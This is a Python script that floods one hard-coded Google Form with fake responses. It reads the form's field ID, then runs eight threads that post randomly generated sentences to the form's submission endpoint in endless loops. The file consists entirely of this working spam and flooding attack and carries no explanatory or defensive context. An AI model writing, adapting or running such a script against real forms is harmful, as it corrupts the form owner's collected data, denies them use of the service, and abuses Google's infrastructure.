from form_tools import *
from requests import post
from faker import Faker
from threading import Thread
from pprint import pprint

fake = Faker()

link = 'https://docs.google.com/forms/d/e/1FAIpQLSe6eS3EPyWi1u53Cgj0LZT6JsRH8TJrgU53n-3s_Ly2OgjiNA/viewform'
entry = get_fields(link)['items'][0]['id']
post_link = f'https://docs.google.com/forms/d/e/{link.split("/")[6]}/formResponse'


def spam(_link, _entry, counter=False, count=0):
    if counter is True:
        counter = 0
        while True:
            counter += count
            print(counter)
            post(_link, data={f'{_entry}': f'{fake.sentence()}'})
    else:
        while True:
            post(_link, data={f'{_entry}': f'{fake.sentence()}'})


t1 = Thread(target=spam, args=(post_link, entry, True, 8))
t1.daemon = True
t1.start()

t2 = Thread(target=spam, args=(post_link, entry))
t2.daemon = True
t2.start()

t3 = Thread(target=spam, args=(post_link, entry))
t3.daemon = True
t3.start()

t4 = Thread(target=spam, args=(post_link, entry))
t4.daemon = True
t4.start()

t5 = Thread(target=spam, args=(post_link, entry))
t5.daemon = True
t5.start()

t6 = Thread(target=spam, args=(post_link, entry))
t6.daemon = True
t6.start()

t7 = Thread(target=spam, args=(post_link, entry))
t7.daemon = True
t7.start()

t8 = Thread(target=spam, args=(post_link, entry))
t8.daemon = True
t8.start()

while True:
    pass
